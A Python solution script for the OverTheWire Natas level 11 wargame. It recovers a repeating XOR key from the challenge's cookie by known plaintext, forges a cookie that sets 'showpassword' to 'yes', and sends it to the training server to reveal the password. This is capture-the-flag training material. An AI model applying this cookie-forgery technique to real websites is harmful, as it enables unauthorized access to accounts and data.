"""
Help script to resolve natas challenge #11
"""
import requests
import json
import base64

level = 'natas11'
url = 'http://{}.natas.labs.overthewire.org'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
From the source code we know that the value of the cookie is calculated:
function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
and decoded like this:
json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
"""


def xor(data, key):
    return bytes(bytearray(a ^ b for a, b in zip(*map(bytearray, [data, key]))))


s = requests.Session()
s.post(url, auth=auth, data={'bgcolor': '#ffffff'})
# We know that the default data of the cookie is:
# $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
# if we XOR the json array with our encrypted cookie value, we should get the key.
data = s.cookies['data']
decoded_bin = base64.b64decode(requests.utils.unquote(data))
key = xor(decoded_bin, b'{"showpassword":"no","bgcolor":"#ffffff"}')
print(key)
# So the key is a repetition of the bytes "qw8J"
key = key[:4]

# Do the reverse operation with our payload.
payload = b'{"showpassword":"yes","bgcolor":"#ffffff"}'
new_key = b'qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw'  # Made by hand.
new_data = requests.utils.quote(base64.b64encode(xor(payload, new_key)))
print(new_data)
s.cookies['data'] = new_data
response = s.get(url, auth=auth)
print(response.text)
